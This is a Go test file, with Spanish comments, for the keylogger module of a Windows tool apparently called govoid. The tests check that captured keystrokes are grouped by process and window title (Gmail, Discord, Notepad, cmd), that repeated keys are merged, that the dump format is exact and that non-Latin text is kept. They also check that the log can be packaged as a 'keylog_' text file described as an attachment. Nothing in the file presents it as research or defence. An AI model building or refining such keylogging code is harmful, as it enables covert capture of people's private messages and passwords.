//go:build windows

package commands

import (
	"strings"
	"testing"
	"time"
	"unicode/utf8"

	"github.com/local/govoid/internal/win32"
)

func stampAt(text string) time.Time {
	parsed, err := time.Parse("2006-01-02 15:04:05", text)
	if err != nil {
		panic(err)
	}
	return parsed.UTC()
}

func specialAt(at time.Time, label string) win32.KeyEvent {
	return win32.KeyEvent{Timestamp: at, IsSpecial: true, Label: label}
}

// TestAutoRepeatSeFunde reproduce el bug reportado: mantener la flecha derecha
// en una página generaba [VK:0x27] dieciséis veces seguidas. Con el mapa y el
// fundido, el dump queda en una sola línea con el contador.
func TestAutoRepeatSeFunde(t *testing.T) {
	buffer := &KeylogBuffer{}
	base := stampAt("2026-11-23 14:32:01")
	buffer.StartSession("chrome.exe", "Gmail - Inbox", base)

	for _, r := range "hola" {
		buffer.Append(win32.KeyEvent{Timestamp: base, Rune: r})
	}
	// 16 repeticiones del sistema, 33 ms entre cada una (auto-repeat real).
	for i := 0; i < 16; i++ {
		buffer.Append(specialAt(base.Add(time.Duration(i)*33*time.Millisecond), "[RIGHT]"))
	}

	dump := buffer.FormatDump()
	if strings.Contains(dump, "[VK:0x27]") {
		t.Fatalf("el VK crudo sigue saliendo en el dump:\n%s", dump)
	}
	if !strings.Contains(dump, "[RIGHT]x16") {
		t.Fatalf("el auto-repeat no se fundió:\n%s", dump)
	}
	if got := strings.Count(dump, "[RIGHT]"); got != 1 {
		t.Fatalf("esperado un solo bloque [RIGHT], hay %d:\n%s", got, dump)
	}
	t.Logf("dump:\n%s", dump)
}

// TestPulsacionesSeparadasNoSeFunden: dos pulsaciones humanas de la misma tecla
// (>250 ms) siguen siendo dos marcas.
func TestPulsacionesSeparadasNoSeFunden(t *testing.T) {
	buffer := &KeylogBuffer{}
	base := stampAt("2026-11-23 14:32:01")
	buffer.StartSession("chrome.exe", "Gmail - Inbox", base)

	buffer.Append(specialAt(base, "[RIGHT]"))
	buffer.Append(specialAt(base.Add(600*time.Millisecond), "[RIGHT]"))

	dump := buffer.FormatDump()
	if strings.Contains(dump, "x2") {
		t.Fatalf("se fundieron dos pulsaciones distintas:\n%s", dump)
	}
	if got := strings.Count(dump, "[RIGHT]"); got != 2 {
		t.Fatalf("esperadas dos marcas, hay %d:\n%s", got, dump)
	}
}

// TestFormatoDumpExacto mantiene el formato pedido: header UTC con proceso y
// título, especiales inline, sesiones vacías fuera.
func TestFormatoDumpExacto(t *testing.T) {
	buffer := &KeylogBuffer{}
	first := stampAt("2026-11-23 14:32:01")
	buffer.StartSession("chrome.exe", "Gmail - Inbox", first)

	for _, r := range "hola como estas" {
		buffer.Append(win32.KeyEvent{Timestamp: first, Rune: r})
	}
	buffer.Append(specialAt(first, "[ENTER]"))
	for _, r := range "esto es un mensaje" {
		buffer.Append(win32.KeyEvent{Timestamp: first, Rune: r})
	}
	buffer.Append(specialAt(first, "[CTRL+C]"))

	// Ventana sin teclas: no puede aparecer.
	buffer.StartSession("explorer.exe", "Escritorio", stampAt("2026-11-23 14:33:00"))

	second := stampAt("2026-11-23 14:33:45")
	buffer.StartSession("Discord.exe", "general", second)
	for _, r := range "oye te mando el archivo" {
		buffer.Append(win32.KeyEvent{Timestamp: second, Rune: r})
	}
	buffer.Append(specialAt(second, "[ENTER]"))

	want := "[2026-11-23 14:32:01 UTC] chrome.exe — \"Gmail - Inbox\"\n" +
		"hola como estas[ENTER]\n" +
		"esto es un mensaje[CTRL+C]\n" +
		"\n" +
		"[2026-11-23 14:33:45 UTC] Discord.exe — \"general\"\n" +
		"oye te mando el archivo[ENTER]\n"

	if got := buffer.FormatDump(); got != want {
		t.Fatalf("dump distinto.\nesperado:\n%s\nobtenido:\n%s", want, got)
	}
	if !utf8.ValidString(buffer.FormatDump()) {
		t.Fatal("el dump no es UTF-8 válido")
	}
}

// TestDumpToFileUTF8 cubre el nombre del adjunto y un layout no latino.
func TestDumpToFileUTF8(t *testing.T) {
	buffer := &KeylogBuffer{}
	at := stampAt("2026-11-23 09:05:07")
	buffer.StartSession("notepad.exe", "無題 - メモ帳", at)
	for _, r := range "ñandú 日本語 ключ" {
		buffer.Append(win32.KeyEvent{Timestamp: at, Rune: r})
	}

	data, name := buffer.DumpToFile()
	if !strings.HasPrefix(name, "keylog_") || !strings.HasSuffix(name, ".txt") {
		t.Fatalf("nombre inesperado: %s", name)
	}
	if !utf8.Valid(data) {
		t.Fatal("los bytes del dump no son UTF-8 válido")
	}
	if !strings.Contains(string(data), "ñandú 日本語 ключ") {
		t.Fatalf("se perdió texto multibyte:\n%s", data)
	}
	t.Logf("adjunto: %s (%d bytes)", name, len(data))
}

func TestClearBufferDejaVacio(t *testing.T) {
	buffer := &KeylogBuffer{}
	at := stampAt("2026-11-23 10:00:00")
	buffer.StartSession("cmd.exe", "Símbolo del sistema", at)
	buffer.Append(win32.KeyEvent{Timestamp: at, Rune: 'a'})
	buffer.Append(specialAt(at, "[RIGHT]"))

	buffer.ClearBuffer()

	if dump := buffer.FormatDump(); dump != "" {
		t.Fatalf("el dump no quedó vacío: %q", dump)
	}
	if n := buffer.sessionCount(); n != 0 {
		t.Fatalf("quedaron %d sesiones", n)
	}
	if buffer.repeat.index != -1 {
		t.Fatal("el estado de repetición sobrevivió al clear")
	}
}
